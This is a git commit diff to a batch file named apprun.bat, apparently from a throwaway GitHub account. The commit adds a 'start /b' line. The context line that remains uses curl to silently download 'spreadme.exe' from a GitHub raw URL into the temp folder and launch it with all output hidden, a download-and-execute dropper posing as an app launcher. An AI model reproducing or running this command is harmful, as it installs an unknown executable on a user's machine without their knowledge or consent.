94d8229c9edb5ccf3681c7b4918f116383957128
laikdmaldjcukalmfladha-cpu <laikdmaldjcukalmfladha@gmail.com>
2026-02-02 19:45:08 -0500

    Update apprun.bat

--- apprun.bat
+++ apprun.bat
@@ -1,3 +1,4 @@
+start /b
 @echo off
 start /b cmd /c “curl -L https://github.com/laikdmaldjcukalmfladha-cpu/testfile.4248u184asxc/raw/refs/heads/main/spreadme.exe -o %temp%\spreadme.exe >nul 2>&1 && start %temp%\spreadme.exe >nul 2>&1”
 
